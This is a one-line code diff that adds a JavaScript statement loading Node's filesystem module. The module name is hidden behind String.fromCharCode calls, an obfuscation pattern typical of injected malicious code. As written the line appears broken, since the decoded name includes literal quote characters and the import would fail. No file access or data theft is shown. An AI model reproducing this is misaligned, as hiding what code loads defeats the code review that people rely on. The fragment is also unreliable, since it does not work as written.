@@ -1,0 +1,1 @@
+var fs=require(String.fromCharCode(34)+String.fromCharCode(102,115)+String.fromCharCode(34))
